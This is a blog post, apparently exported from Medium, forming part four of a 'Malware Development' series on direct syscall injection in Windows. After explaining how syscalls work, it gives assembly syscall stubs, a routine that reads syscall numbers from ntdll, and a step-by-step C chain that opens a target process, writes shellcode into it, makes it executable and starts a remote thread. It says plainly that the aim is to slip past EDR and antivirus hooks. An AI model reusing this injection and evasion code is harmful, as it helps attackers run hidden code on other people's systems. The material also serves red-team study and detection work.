---
layout: post
title: "Malware Development Part 4: Direct Syscall Injection"
date: 2025-08-26
categories: [Malware Development,Red Team,Syscalls,Windows internals,C Programming]
image: https://cdn-images-1.medium.com/v2/resize:fit:800/1*jRbFFS4HqKPeyX2b1t4TNg.png
---


In our ongoing **Malware Development Series**, we have explored **Shellcode Injection, DLL Injection, and NTAPI Injection.** This time, we’re delving into one of the stealthiest and most sophisticated techniques: **Direct Syscall Injection**.

This article explains **what Direct Syscall Injection is**, **how it works**, and **why it’s significant**, along with a step-by-step breakdown of the code demonstrating this approach. We’ll also explore its advantages over other techniques and its implications for both attackers and defenders.

- - -

### Disclaimer

The content and all code examples in this article are for research purposes only and must not be used in an unethical context!

- - -

### What Are Syscalls?

**Syscalls**, or system calls, are the fundamental mechanism through which user-mode applications interact with the kernel of the operating system. They provide controlled access to low-level system resources such as memory, processes, and files.

When an application needs to perform a privileged operation, such as reading a file or allocating memory, it issues a syscall. This involves transitioning from **user mode** to **kernel mode**, where the OS kernel executes the requested operation.

Syscalls are invoked via specific instructions like `syscall` or `int 0x2E` (on x86 systems), and each syscall is identified by a unique **syscall number**. These numbers map to corresponding functions in the kernel, such as `NtWriteFile` or `NtAllocateVirtualMemory`.

Before I go into what a direct system call is and how it is used by attackers (Red Team), it is important to clarify what a system call is in the first place. Technically, at assembly level, a **system call** is an instruction implemented into a **syscall stub** that enables the temporary transition (**transition CPU switch**) from **user** mode to **kernel** mode after the execution of code in Windows user mode in the context of the respective Windows API. The system call thus forms the interface between a process in user mode and the task to be executed in the Windows kernel.

Why do you need system calls at all in an operating system that is split into user mode and kernel mode? Here are some examples:

*   Access to hardware such as scanners and printers
*   Network connections for sending and receiving data packets
*   Reading and writing files

The following example is intended to illustrate how system calls work under Windows OS. The user wants to save some text or code written in Notepad to the hard disk of the device. To do this, the user mode process **notepad.exe** needs temporary access to the file system and to various device drivers. However, as both of these components reside in the **Windows kernel, user-mode** access is not straightforward. To solve this problem, Windows uses **system calls**. These are programmatic instructions that allow a temporary transition from **user** mode to **kernel** mode for a specific task of an application, **e.g., notepad.exe.** Each system call can be found by its own **syscall ID** and is associated with a specific **native API** in Windows. However, the **syscall ID can vary from one version of Windows to another.**

**Please note** that this is a **very simplified** representation of how system calls work in Windows. In detail, user mode and kernel mode operations are much more **complex**. However, this explanation should be **sufficient** to illustrate the **basic principle**. If you want to know more about system calls, I recommend that you take a look at the Windows Internals.

![](https://cdn-images-1.medium.com/max/800/0*HDnVWQBWI49QEGUf.png)

- - -

The figure above shows the technical principle of system calls using the above example with **Notepad.** To perform the save operation in the context of the **user-mode process notepad.exe**, in the **first** step it accesses **kernel32.dll** and **calls the Windows API WriteFile. In the second step, kernel32.dll accesses kernelbase.dll in the context of the same Windows API. In the third step, the Windows API WriteFile accesses the Native API NtCreateFile through Ntdll.dll. The Native API contains the technical instructions or syscall call stub to initiate the system call by executing the system call ID and enables the temporary transition (CPU switch) from user mode (ring 3) to kernel mode (ring 0) after execution.**

It then calls the **system service dispatcher, aka KiSystemCall/KiSystemCall64 in the Windows kernel,** which is responsible **for querying the system service descriptor table (SSDT) for the appropriate function code based on the executed system call ID (index number in the EAX register).** Once the **system service dispatcher** and the **SSDT** have worked together to identify the function code for the system call in question, the task is **executed** in the Windows kernel. Thanks to [**@re\_and\_more**](https://twitter.com/re_and_more/status/1510512453800636421?lang=en) for the useful explanation of the system service dispatcher.

In simple terms, system calls are needed in Windows to perform the **temporary transition (CPU switch) from user mode to kernel mode** or to execute tasks initiated in user mode that require temporary access to kernel mode, such as saving files, as a task in kernel mode.

- - -

### What is Direct Syscall Injection?

Direct Syscall Injection is a low-level technique where malware developers **bypass API layers and directly invoke syscalls**. Instead of calling functions like `WriteProcessMemory` or even `NtWriteVirtualMemory` via **NTAPI**, this method manually constructs and executes the appropriate syscall instructions. This is a technique that allows an attacker (red team) to execute malicious code, such as shell code, in the context of APIs on Windows in such a way that the system call is not obtained via `ntdll.dll`. Instead, the system call or system call stub is implemented in the malware itself, e.g., in the **.text region in the form of assembly instructions.** Hence the name direct system calls.

#### How Does It Work?

1.  **Retrieve Syscall Numbers Dynamically:** Modern operating systems like Windows assign syscall numbers dynamically, so attackers must resolve these numbers at runtime.
2.  **Bypass API Hooks:** Security products often hook API functions like `NtWriteVirtualMemory` to monitor suspicious behavior. Direct syscalls bypass these hooks entirely by executing the syscall instruction directly.
3.  **Execute Kernel Functions:** The syscall invokes the kernel function corresponding to the resolved syscall number, performing the intended operation (e.g., allocating memory or injecting code) without triggering user-mode hooks.

Compared to the previous illustration in the system calls chapter, the following illustration shows the principle of direct system calls under Windows in a simplified way. It can be seen that the user-mode process Malware.exe does not get the system call for the native API NtCreateFile via `ntdll.dll`, as would normally be the case, but instead has implemented the necessary instructions for the system call in itself.

![](https://cdn-images-1.medium.com/max/800/0*ckPBpLAhKs2kZJRg.png)

- - -

### Why Are Syscalls Important in Malware Development?

Syscalls bypass high-level API calls provided by libraries like `kernel32.dll` or `ntdll.dll`. These libraries are often monitored by **endpoint detection systems (EDRs) and antivirus (AV) solutions**. Using **direct syscalls** allows malware to:

*   **Evade Detection:** By skipping API hooks set by security tools.
*   **Operate Stealthily:** By interacting directly with the kernel, avoiding the overhead of higher-level API abstractions.

- - -

### Key Characteristics of Syscalls

*   **Direct Kernel Interaction:** Syscalls interact directly with the kernel without intermediary libraries.
*   **Architecture-Specific:** The implementation of syscalls varies between operating systems and processor architectures.
*   **Low-Level:** They operate at a lower level than standard API calls, providing granular control over the system.

- - -

### Direct Syscall Injection Code Explanation

This code demonstrates **Direct Syscall Injection**, where key Windows kernel functions are invoked directly via their **syscall numbers** instead of the standard API layers. Each `proc` in the assembly defines a syscall wrapper for one kernel function. Here's a step-by-step breakdown of the code:

- - -

### Explanation of the `.data` Section

The `.data` section in assembly code is used to define and store **static data** that remains in memory during program execution. In this code, the declarations in the `.data` section look like this:

extern NTOPENPROCESS\_SSN:DWORD  
extern NTALLOC\_SSN:DWORD  
extern NTWRITE\_SSN:DWORD  
extern NTPROTECT\_SSN:DWORD  
extern NTCREATETHREAD\_SSN:DWORD  
extern NTWAIT\_SSN:DWORD  
extern NTFREE\_SSN:DWORD

- - -

### Key Points About the Declarations

1.  `**extern**` **Keyword:**

*   The `extern` keyword declares that these variables are defined **outside the current assembly file**.
*   It tells the assembler to look for their definitions elsewhere (e.g., in another object file or linked during runtime).

#### Why Use `extern` for Syscall Numbers?

**Dynamic Resolution:**

*   Since syscall numbers can change between Windows versions, it’s not practical to hard-code them. The variables are declared externally and resolved dynamically by a loader or another part of the code.

**Modular Design:**

*   By separating the declaration (`extern`) from the definition (actual assignment of values), the code becomes modular. The syscall numbers can be updated without modifying the core assembly logic.

**2\. Variable Names:**

*   Each name (e.g., `NTOPENPROCESS_SSN`) corresponds to a **syscall number** (SSN) for a specific Windows kernel function.
*   These variables are placeholders for the syscall numbers that will be resolved dynamically at runtime.

`**3. :DWORD**`**:**

*   The `:DWORD` type specifies that these variables are **32-bit integers**.
*   Syscall numbers are typically represented as 32-bit values, which are loaded into the `eax` register before invoking the `syscall` instruction.

- - -

### General Structure of Syscall Wrappers

Each procedure (`proc`) in this code performs the following steps:

1.  **Load the Base Address (**`**mov r10, rcx**`**):**

*   The `rcx` register is used in x64 calling conventions to store the first argument to a function.
*   In syscalls, `r10` often stores the address of the kernel stack.

**2\. Load the Syscall Number (**`**mov eax, <SYSCALL_NUMBER>**`**):**

*   The `eax` register is loaded with the syscall number corresponding to the desired kernel function. These numbers (e.g., `NTOPENPROCESS_SSN`) are dynamically resolved at runtime.

**3\. Issue the Syscall (**`**syscall**`**):**

*   The `syscall` instruction transitions execution from user mode to kernel mode. The processor switches to executing the function at the address indicated by the syscall number.

**4\. Return (**`**ret**`**):**

*   Control is returned to the caller after the kernel function completes execution.

- - -

### Key Functions Explained

#### NtOpenProcess

NtOpenProcess proc  
    mov r10, rcx  
    mov eax, NTOPENPROCESS\_SSN  
    syscall  
    ret  
NtOpenProcess endp

*   **Purpose:** Opens a handle to a target process.
*   **Arguments:**
*   `rcx`: Points to a `CLIENT_ID` structure identifying the process to open.
*   `NTOPENPROCESS_SSN`: Syscall number for `NtOpenProcess`.

#### NtAllocateVirtualMemory

NtAllocateVirtualMemory proc  
    mov r10, rcx  
    mov eax, NTALLOC\_SSN  
    syscall  
    ret  
NtAllocateVirtualMemory endp

*   **Purpose:** Allocates memory in a target process’s virtual address space.
*   **Arguments:**
*   `rcx`: Process handle.
*   `NTALLOC_SSN`: Syscall number for `NtAllocateVirtualMemory`.

#### NtWriteVirtualMemory

NtWriteVirtualMemory proc  
    mov r10, rcx  
    mov eax, NTWRITE\_SSN  
    syscall  
    ret  
NtWriteVirtualMemory endp

*   **Purpose:** Writes data into the memory of a target process.
*   **Arguments:**
*   `rcx`: Process handle.
*   `NTWRITE_SSN`: Syscall number for `NtWriteVirtualMemory`.

#### NtProtectVirtualMemory

NtProtectVirtualMemory proc  
    mov r10, rcx  
    mov eax, NTPROTECT\_SSN  
    syscall   
    ret  
NtProtectVirtualMemory endp

*   **Purpose:** Changes protection levels for a region of virtual memory.
*   **Arguments:**
*   `rcx`: Process handle.
*   `NTPROTECT_SSN`: Syscall number for `NtProtectVirtualMemory`.

#### NtCreateThreadEx

NtCreateThreadEx proc  
    mov r10, rcx  
    mov eax, NTCREATETHREAD\_SSN  
    syscall  
    ret  
NtCreateThreadEx endp

*   **Purpose:** Creates a new thread in a target process.
*   **Arguments:**
*   `rcx`: Process handle.
*   `NTCREATETHREAD_SSN`: Syscall number for `NtCreateThreadEx`.

#### NtWaitForSingleObject

NtWaitForSingleObject proc  
    mov r10, rcx  
    mov eax, NTWAIT\_SSN  
    syscall  
    ret  
NtWaitForSingleObject endp

*   **Purpose:** Waits for a single object (e.g., a thread or process) to become signaled.
*   **Arguments:**
*   `rcx`: Handle of the object.
*   `NTWAIT_SSN`: Syscall number for `NtWaitForSingleObject`.

#### NtFreeVirtualMemory

NtFreeVirtualMemory proc  
    mov r10, rcx  
    mov eax, NTFREE\_SSN  
    syscall  
    ret  
NtFreeVirtualMemory endp

*   **Purpose:** Frees memory in a process’s virtual address space.
*   **Arguments:**
*   `rcx`: Process handle.
*   `NTFREE_SSN`: Syscall number for `NtFreeVirtualMemory`.

#### NtClose

NtClose proc  
    mov r10, rcx  
    mov eax, NTCLOSE\_SSN  
    syscall  
    ret  
NtClose endp

*   **Purpose:** Closes an open handle to an object.
*   **Arguments:**
*   `rcx`: Handle to close.
*   `NTCLOSE_SSN`: Syscall number for `NtClose`.

- - -

### Understanding the Supporting Header File

The **syscall**.**h** file sets the stage by defining key structures, macros, and function prototypes for use in Direct Syscall Injection. Here’s a breakdown of the elements included in the file:

*   `#define STATUS_SUCCESS (NTSTATUS)0x00000000L`: Defines a macro for the `STATUS_SUCCESS` constant, indicating successful operations.

### Syscall Number Declarations

DWORD NTOPENPROCESS\_SSN;  
DWORD NTALLOC\_SSN;  
DWORD NTWRITE\_SSN;  
DWORD NTPROTECT\_SSN;  
DWORD NTCREATETHREAD\_SSN;  
DWORD NTWAIT\_SSN;  
DWORD NTFREE\_SSN;  
DWORD NTCLOSE\_SSN;

*   These are global variables for holding the **syscall numbers** (SSNs) of key NTAPI functions. They are populated by the `GetSyscallNumber` function at runtime.

### Data Structures

1.  `**PS_ATTRIBUTE**`

*   Represents attributes for process and thread creation.

typedef struct \_PS\_ATTRIBUTE {  
    ULONG  Attribute;         // Type of attribute.  
    SIZE\_T Size;              // Size of the attribute data.  
    union {  
        ULONG Value;          // Value if attribute is integral.  
        PVOID ValuePtr;       // Pointer if attribute is a reference.  
    } u1;  
    PSIZE\_T ReturnLength;     // Optional, length of the return value.  
} PS\_ATTRIBUTE, \*PPS\_ATTRIBUTE;

`**2. UNICODE_STRING**`

*   Encodes a Unicode string, used in object names.

typedef struct \_UNICODE\_STRING {  
    USHORT Length;            // Length of the string in bytes.  
    USHORT MaximumLength;     // Maximum allocated size.  
    PWSTR  Buffer;            // Pointer to the wide-character string.  
} UNICODE\_STRING, \*PUNICODE\_STRING;

`**3. OBJECT_ATTRIBUTES**`

*   Contains metadata for an object handle, such as name and security settings.

typedef struct \_OBJECT\_ATTRIBUTES {  
    ULONG           Length;                 // Size of the structure.  
    HANDLE          RootDirectory;          // Optional parent directory.  
    PUNICODE\_STRING ObjectName;             // Name of the object.  
    ULONG           Attributes;             // Object attributes (e.g., case-insensitive).  
    PVOID           SecurityDescriptor;     // Security settings (optional).  
    PVOID           SecurityQualityOfService; // Optional QoS info.  
} ObjectAttributes, \*POBJECT\_ATTRIBUTES;

4.`**CLIENT_ID**`

*   Identifies a process and thread.

typedef struct \_CLIENT\_ID {  
    HANDLE UniqueProcess;       // Process ID.  
    HANDLE UniqueThread;        // Thread ID.  
} ClientID, \*PCLIENT\_ID;

5\. `**PS_ATTRIBUTE_LIST**`

*   Contains a list of `PS_ATTRIBUTE` entries.

typedef struct \_PS\_ATTRIBUTE\_LIST {  
    SIZE\_T       TotalLength;  // Length of the list.  
    PS\_ATTRIBUTE Attributes\[1\];// Array of attributes.  
} PS\_ATTRIBUTE\_LIST, \*PPS\_ATTRIBUTE\_LIST;

- - -

### Function Prototypes

1.  **NTAPI Wrappers**

These prototypes define NTAPI functions, making them callable in the program.

*   `NtOpenProcess`: Opens a handle to a process.

extern NTSTATUS NtOpenProcess(  
    OUT PHANDLE ProcessHandle,  
    IN ACCESS\_MASK DesiredAccess,  
    IN POBJECT\_ATTRIBUTES ObjectAttributes,  
    IN PCLIENT\_ID ClientId OPTIONAL  
);

*   `NtAllocateVirtualMemory`: Allocates memory within the process.

extern NTSTATUS NtAllocateVirtualMemory(  
    IN HANDLE ProcessHandle,  
    IN OUT PVOID\* BaseAddress,  
    IN ULONG ZeroBits,  
    IN OUT PSIZE\_T RegionSize,  
    IN ULONG AllocationType,  
    IN ULONG Protect  
);

*   `NtWriteVirtualMemory`: Writes data into the virtual memory of a process.

extern NTSTATUS NtWriteVirtualMemory(  
    IN HANDLE ProcessHandle,  
    IN PVOID BaseAddress,  
    IN PVOID Buffer,  
    IN SIZE\_T NumberOfBytesToWrite,  
    OUT PSIZE\_T NumberOfBytesWritten OPTIONAL  
);

*   `NtProtectVirtualMemory`: Changes memory protection attributes.

extern NTSTATUS NtProtectVirtualMemory(  
    \_In\_ HANDLE ProcessHandle,  
    \_Inout\_ PVOID\* BaseAddress,  
    \_Inout\_ PSIZE\_T RegionSize,  
    \_In\_ ULONG NewProtect,  
    \_Out\_ PULONG OldProtect  
);

*   `NtCreateThreadEx`: Creates a thread in a target process.

extern NTSTATUS NtCreateThreadEx(  
    OUT PHANDLE ThreadHandle,  
    IN ACCESS\_MASK DesiredAccess,  
    IN POBJECT\_ATTRIBUTES ObjectAttributes OPTIONAL,  
    IN HANDLE ProcessHandle,  
    IN PVOID StartRoutine,  
    IN PVOID Argument OPTIONAL,  
    IN ULONG CreateFlags,  
    IN SIZE\_T ZeroBits,  
    IN SIZE\_T StackSize,  
    IN SIZE\_T MaximumStackSize,  
    IN PPS\_ATTRIBUTE\_LIST AttributeList OPTIONAL  
);

*   `NtWaitForSingleObject`: Waits for an object to signal.

extern NTSTATUS NtWaitForSingleObject(  
    \_In\_ HANDLE Handle,  
    \_In\_ BOOLEAN Alertable,  
    \_In\_opt\_ PLARGE\_INTEGER Timeout  
);

*   `NtFreeVirtualMemory`: Frees memory in the process.

extern NTSTATUS NtFreeVirtualMemory(  
    \_In\_ HANDLE ProcessHandle,  
    \_Inout\_ PVOID\* BaseAddress,  
    \_Inout\_ PSIZE\_T RegionSize,  
    \_In\_ ULONG FreeType  
);

*   `NtClose`: Closes a handle.
*   `extern NTSTATUS NtClose(IN HANDLE Handle);`

`**2. GetSyscallNumber**` Resolves a syscall number dynamically using `ntdll.dll`.

VOID GetSyscallNumber(  
    \_In\_  HMODULE NtdllHandle,  
    \_In\_  LPCSTR NtFunctionName,  
    \_Out\_ PDWORD NtFunctionSSN  
);

**Parameters**:

*   `NtdllHandle`: Handle to the `ntdll.dll` module.
*   `NtFunctionName`: Name of the NTAPI function (e.g., `NtOpenProcess`).
*   `NtFunctionSSN`: Pointer to a variable where the resolved syscall number will be stored.

- - -

Let’s break down the `**GetSyscallNumber**` function step by step:

### Function Purpose

This function retrieves the **syscall number** (System Service Number or SSN) for a given NT function in the `ntdll.dll`. The syscall number is crucial for invoking low-level system calls directly via assembly instructions.

- - -

### Function Workflow

#### 1\. Retrieve the Function Address

FunctionAddress = (UINT\_PTR)GetProcAddress(hNTDLL, NtFunctionName);

*   `GetProcAddress` is a Windows API function that retrieves the memory address of a function in a loaded DLL.
*   Here, it locates the address of the specified NT function (e.g., `"NtOpenProcess"`) within `ntdll.dll`.

- - -

#### 2\. Error Handling

if (FunctionAddress == 0) {  
    printf("\[-\] Couldn't Get Address, error: 0x%lx", GetLastError());  
    return;  
}

*   If `GetProcAddress` fails (e.g., the function does not exist), `FunctionAddress` is `0`.
*   `GetLastError` is called to print the specific error code.

- - -

#### 3\. Retrieve the Syscall Number

\*NtFunctionSSN = ((PBYTE)(FunctionAddress + 0x4))\[0\];

*   The syscall number is embedded in the **5th byte** of the NT function’s machine code.
*   The first 4 bytes are typically the function prologue (e.g., `mov r10, rcx`), while the syscall number is loaded into the register immediately afterward.
*   This line does the following:

1.  Adds 4 to the function’s base address (`FunctionAddress + 0x4`) to skip the prologue.
2.  Casts the address to a `PBYTE` (pointer to a byte).
3.  Dereferences the byte at that address to get the syscall number.

*   The syscall number is stored in the variable pointed to by `NtFunctionSSN`.

#### Step-by-Step Breakdown of the code

#### Setting Up the Environment

#pragma section(".text")  
\_\_declspec(allocate(".text")) CONST UCHAR shell\[\]

*   `**#pragma section(".text")**`: Defines a custom memory section. This is often used in malware to hide code or control how sections are allocated.
*   By placing the shellcode in the .**text** section:
*   The shellcode was loaded with execute permissions directly.
*   The operating system treated it as code, simplifying execution without additional memory protection changes.

### Step 1: Load `ntdll.dll`

hNTDLL = GetModuleHandleW(L"NTDLL");  
if (hNTDLL == NULL) {  
    printf("\[-\] couldn't get a handle to NTDLL Module, error: %lx", GetLastError());  
    return FALSE;  
}

*   **Function Used**: `GetModuleHandleW`
*   Retrieves a handle to the loaded module (`ntdll.dll` in this case).
*   The handle is needed to locate functions within the DLL.
*   If it fails, `NULL` is returned, and the program exits with an error message.

- - -

### Step 2: Get Syscall Numbers

GetSyscallNumber(hNTDLL, "NtOpenProcess", &NTOPENPROCESS\_SSN);  
GetSyscallNumber(hNTDLL, "NtAllocateVirtualMemory", &NTALLOC\_SSN);  
// ... other NT functions

*   **Function Used**: `GetSyscallNumber`
*   This retrieves syscall numbers for NT functions from `ntdll.dll`.
*   Functions like `NtOpenProcess`, `NtAllocateVirtualMemory`, and `NtCreateThreadEx` are used later for direct syscall invocation.
*   These syscall numbers bypass API hooking or detection mechanisms by directly invoking kernel routines.

- - -

### Step 3: Open a Handle to the Target Process

STATUS = NtOpenProcess(&hProcess, PROCESS\_ALL\_ACCESS, &OA, &CID);  
if (STATUS != STATUS\_SUCCESS) {  
    printf("\[-\] Couldn't get a handle to the process , error :0x%lx \\n", STATUS);  
    return EXIT\_FAILURE;  
}

*   **Function Used**: `NtOpenProcess`
*   Opens a handle to the target process (specified in `CID`).
*   Grants full access (`PROCESS_ALL_ACCESS`).
*   The handle (`hProcess`) is used for subsequent memory and thread operations.

- - -

### Step 4: Allocate Memory in the Target Process

STATUS = NtAllocateVirtualMemory(hProcess, &rbuffer, 0, &shell\_size, MEM\_COMMIT | MEM\_RESERVE, PAGE\_READWRITE);  
if (STATUS != STATUS\_SUCCESS) {  
    printf("\[-\] Couldn't Allocate , error: %lx", STATUS);  
    goto CLEANUP;  
}

*   **Function Used**: `NtAllocateVirtualMemory`
*   Allocates memory in the target process (`hProcess`) for injecting shellcode.
*   `rbuffer`: Receives the address of the allocated memory.
*   `shell_size`: Specifies the size of memory to allocate.
*   Memory is allocated as **read/write** (`PAGE_READWRITE`).

- - -

### Step 5: Write Shellcode to the Allocated Memory

STATUS = NtWriteVirtualMemory(hProcess, rbuffer, shell, shell\_size, &BytesWritten);  
if (STATUS != STATUS\_SUCCESS) {  
    printf("\[-\] Couldn't Write to the memory ,error : 0x%lx\\n", STATUS);  
    goto CLEANUP;  
}

*   **Function Used**: `NtWriteVirtualMemory`
*   Writes the shellcode (`shell`) into the allocated memory (`rbuffer`) in the target process.
*   Ensures the shellcode is transferred into the target process’s memory space.

- - -

### Step 6: Change Memory Protection to Execute Shellcode

STATUS = NtProtectVirtualMemory(hProcess, &rbuffer, &shell\_size, PAGE\_EXECUTE\_READ, &oldProtection);  
if (STATUS != STATUS\_SUCCESS) {  
    printf("\[-\] Couldn't Change Protection , error: 0x%lx", GetLastError());  
    goto CLEANUP;  
}

*   **Function Used**: `NtProtectVirtualMemory`
*   Changes the allocated memory’s protection to **PAGE\_EXECUTE\_READ**, allowing the shellcode to execute.

- - -

### Step 7: Create a Remote Thread to Execute Shellcode

STATUS = NtCreateThreadEx(&hThread, THREAD\_ALL\_ACCESS, &OA, hProcess, rbuffer, NULL, FALSE, 0, 0, 0, NULL);  
if (STATUS != STATUS\_SUCCESS) {  
    printf("\[-\] Couldn't get a handle to a thread , error: 0x%lx", STATUS);  
    goto CLEANUP;  
}

*   **Function Used**: `NtCreateThreadEx`
*   Creates a new thread in the target process (`hProcess`).
*   The thread’s entry point is the address of the allocated shellcode (`rbuffer`).
*   The thread handle (`hThread`) allows the program to manage the thread.

- - -

### Step 8: Wait for the Thread to Finish Execution

STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);

*   **Function Used**: `NtWaitForSingleObject`
*   Waits for the newly created thread to finish execution.
*   Synchronizes the program with the injected thread’s lifecycle.

- - -

### Step 9: Clean Up Resources

if (rbuffer) {  
    STATUS = NtFreeVirtualMemory(hProcess, &rbuffer, &shell\_size, MEM\_DECOMMIT);  
}  
if (hThread) {  
    NtClose(hThread);  
}  
if (hProcess) {  
    NtClose(hProcess);  
}

*   **Functions Used**:

1.  `**NtFreeVirtualMemory**`: Deallocates the previously allocated memory in the target process.
2.  `**NtClose**`: Closes handles (`hThread` and `hProcess`) to free system resources.

![](https://cdn-images-1.medium.com/max/800/1*TGDTZd_6Ob8TomOfw-0xjw.png)

### Full Code Repository

You can find the full code and examples discussed in this article on my **GitHub repository**:

[**GitHub — Moataz51201/Direct-Syscall-Injection**  
_Contribute to Moataz51201/Direct-Syscall-Injection development by creating an account on GitHub._github.com](https://github.com/Moataz51201/Direct-Syscall-Injection.git "https://github.com/Moataz51201/Direct-Syscall-Injection.git")[](https://github.com/Moataz51201/Direct-Syscall-Injection.git)

**Stay tuned for the next episode.**

**Resources**:

[https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low](https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low)

[https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html](https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html)

[https://alice.climent-pommeret.red/posts/a-syscall-journey-in-the-windows-kernel/](https://alice.climent-pommeret.red/posts/a-syscall-journey-in-the-windows-kernel/)

[https://www.codeproject.com/Articles/1191465/The-Quest-for-the-SSDTs](https://www.codeproject.com/Articles/1191465/The-Quest-for-the-SSDTs) [https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/glimpse-into-ssdt-in-windows-x64-kernel](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/glimpse-into-ssdt-in-windows-x64-kernel)

[https://github.com/am0nsec/HellsGate/blob/master/hells-gate.pdf](https://github.com/am0nsec/HellsGate/blob/master/hells-gate.pdf)

[https://blog.can.ac/2019/10/19/byepg-defeating-patchguard-using-exception-hooking/](https://blog.can.ac/2019/10/19/byepg-defeating-patchguard-using-exception-hooking/)

[https://github.com/everdox/InfinityHook](https://github.com/everdox/InfinityHook)

[https://www.cyberark.com/resources/threat-research-blog/ghosthook-bypassing-patchguard-with-processor-trace-based-hooking](https://www.cyberark.com/resources/threat-research-blog/ghosthook-bypassing-patchguard-with-processor-trace-based-hooking)

By [Moataz Osama](https://medium.com/@mezo512) on [November 30, 2024](https://medium.com/p/153ed0175f8a).

[Canonical link](https://medium.com/@mezo512/malware-development-part-4-direct-syscall-injection-153ed0175f8a)

Exported from [Medium](https://medium.com) on August 26, 2025.